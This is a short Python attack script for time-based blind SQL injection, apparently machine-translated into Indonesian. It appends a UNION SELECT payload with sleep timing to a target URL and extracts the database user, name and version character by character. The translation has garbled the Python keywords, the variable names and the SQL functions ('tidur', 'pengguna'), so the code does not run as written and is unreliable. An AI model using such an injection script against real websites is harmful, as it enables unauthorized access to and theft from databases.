# - * - coding: utf-8 - * -
# @Author: wongNdeso_godeyes
# @Tanggal: 2017-02-12 21:32:31
# @Lalu Dimodifikasi oleh: wongNdeso
# @Lalu Waktu yang membahas: 2017-02-12 21:32:42
impor sys
string impor
waktu impor , datetime
permintaan impor

def  main ( url ):
    print ( ' Loding ... ' )
    print ( ' Mulai Serang .... ' )
    # payload = daftar (string.ascii_letters)
    payload =  daftar (string.ascii_lowercase)
    payload + = [ ' _ ' , ' . ' , ' @ ' , ' , ' , ' - ' ]
    payload + = [ str (num) untuk num dalam  rentang ( 0 , 10 )]
    maxLength =  30
    mengeksploitasi = []
    untuk i dalam  xrange (maxLength):
        untuk elemen dalam payload:
            t1 = time.time ()
            poc = url + " union select if ((ord (SUBSTR (concat_ws ('----', pengguna (), database (), versi ()), " + str (i + 1 ) + " , 1)) = ord (' " + elemen + " ')) = 1, tidur (0), tidur (0,5)), 2,3 "
            response = requests.get (poc)
            jika response.status_code == 200 :
                t2 = time.time ()
                jika t2 - t1 < 0,5 :
                    exploit.append (elemen)
                    print ( ' ' .join (mengeksploitasi) + ' ... ' )
                    terus
    cetak ( ' Selesai ... ' )
 bantuan def ():
    print ( ' ----- Penggunaan: ----- \ n ' )

jika  __name__  ==  ' __main__ ' :
    args = sys.argv
    jika  len (args) ==  3 :
        jika args [ 1 ] ==  ' -u ' :
            main (args [ 2 ])
        lain :
            help ()
    lain :
        help ()
